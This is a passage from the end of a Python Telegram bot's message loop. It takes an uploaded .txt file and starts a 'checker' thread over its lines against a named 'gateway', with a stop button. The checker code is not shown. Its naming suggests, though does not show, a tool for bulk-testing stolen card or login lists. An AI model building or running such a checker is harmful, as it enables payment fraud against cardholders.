                                            [{"text": "🛑 STOP", "callback_data": f"stop_{chat_id}"}]
                                        ]
                                    }
                                    resp = send_telegram(chat_id, initial_msg, initial_buttons)
                                    if resp:
                                        message_id = resp.json().get("result", {}).get("message_id")
                                        thread = threading.Thread(target=start_checker, args=(chat_id, lines, gateway_name, message_id))
                                        active_scans[chat_id] = {"stop": False, "thread": thread}
                                        thread.start()
                            else:
                                send_telegram(chat_id, "<b>❌ Invalid file format.</b>")
                    else:
                        send_telegram(chat_id, "<b>❌ Please send a .txt file.</b>")
        
        except Exception as e:
            print(f"Loop Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    handle_updates()
